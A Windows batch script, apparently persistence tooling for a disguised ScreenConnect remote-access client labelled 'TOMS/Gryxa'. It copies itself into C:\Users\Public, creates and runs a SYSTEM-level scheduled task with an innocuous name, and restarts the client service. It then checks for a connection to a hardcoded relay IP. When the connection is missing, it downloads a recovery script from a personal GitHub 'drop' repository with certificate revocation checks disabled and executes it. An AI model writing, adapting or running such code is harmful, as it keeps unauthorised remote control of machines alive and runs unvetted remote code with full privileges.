@echo off
rem TOMS/Gryxa: service Running but no EST to relay — restart + verify (schtasks-safe).
rem Optional: pass --reinstall to UI-MSI heal if still no EST after restart.
if /I not "%~1"=="--detached" (
  copy /y "%~f0" "C:\Users\Public\toms_gk.cmd" >nul 2>&1
  schtasks /Delete /TN WinRTCSTomsGK /F >nul 2>&1
  if /I "%~1"=="--reinstall" (
    schtasks /Create /TN WinRTCSTomsGK /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c C:\Users\Public\toms_gk.cmd --detached --reinstall"
  ) else (
    schtasks /Create /TN WinRTCSTomsGK /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c C:\Users\Public\toms_gk.cmd --detached"
  )
  schtasks /Run /TN WinRTCSTomsGK
  echo QUEUED toms-gryxa-kick - log C:\Users\Public\toms_gk.log
  exit /b 0
)
setlocal EnableExtensions
set "LOG=C:\Users\Public\toms_gk.log"
set "GSVC=ScreenConnect Client (36e506ff016b2151)"
set "REINSTALL="
if /I "%~2"=="--reinstall" set "REINSTALL=1"
>"%LOG%" echo [%DATE% %TIME%] begin host=%COMPUTERNAME% reinstall=%REINSTALL%

echo [%DATE% %TIME%] before>>"%LOG%"
sc query "%GSVC%" >>"%LOG%" 2>&1
powershell -NoP -NonI -EP Bypass -Command ^
  "$s=Get-CimInstance Win32_Service -Filter \"Name='%GSVC%'\"; if($s.ProcessId){ Get-NetTCPConnection -OwningProcess $s.ProcessId -State Established -EA 0 | ForEach-Object { Add-Content '%LOG%' ('EST_BEFORE '+$_.RemoteAddress+':'+$_.RemotePort) } } else { Add-Content '%LOG%' 'EST_BEFORE none_or_no_pid' }; try { Add-Content '%LOG%' ('dns='+[System.Net.Dns]::GetHostEntry('update.gryxa.com').AddressList[0].IPAddress) } catch { Add-Content '%LOG%' 'dns=FAIL' }"

echo [%DATE% %TIME%] restart_gryxa>>"%LOG%"
sc stop "%GSVC%" >>"%LOG%" 2>&1
ping -n 5 127.0.0.1 >nul
sc start "%GSVC%" >>"%LOG%" 2>&1
ping -n 16 127.0.0.1 >nul

echo [%DATE% %TIME%] after_restart>>"%LOG%"
sc query "%GSVC%" | findstr STATE >>"%LOG%"
powershell -NoP -NonI -EP Bypass -Command ^
  "$s=Get-CimInstance Win32_Service -Filter \"Name='%GSVC%'\"; Add-Content '%LOG%' ('pid='+$s.ProcessId+' state='+$s.State); $est=@(Get-NetTCPConnection -OwningProcess $s.ProcessId -State Established -EA 0); if($est.Count -eq 0){ Add-Content '%LOG%' 'EST_AFTER NONE' } else { $est | ForEach-Object { Add-Content '%LOG%' ('EST_AFTER '+$_.RemoteAddress+':'+$_.RemotePort) } }; if($est.Count -gt 0){ Add-Content '%LOG%' 'KICK_OK' }"

findstr /C:"EST_AFTER 209.145.55.189" "%LOG%" >nul
if not errorlevel 1 (
  echo [%DATE% %TIME%] connected_ok>>"%LOG%"
  endlocal & exit /b 0
)

if not defined REINSTALL (
  echo [%DATE% %TIME%] still_no_est_try_reinstall_flag>>"%LOG%"
  echo STILL_NO_EST
  endlocal & exit /b 4
)

echo [%DATE% %TIME%] fetch_ui_recover>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 90 -o C:\Users\Public\gryxa_recover.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd >>"%LOG%" 2>&1
if not exist C:\Users\Public\gryxa_recover.cmd (
  echo [%DATE% %TIME%] FAIL_no_recover>>"%LOG%"
  endlocal & exit /b 3
)
call C:\Users\Public\gryxa_recover.cmd --detached
echo [%DATE% %TIME%] r3_queued>>"%LOG%"
endlocal & exit /b 0
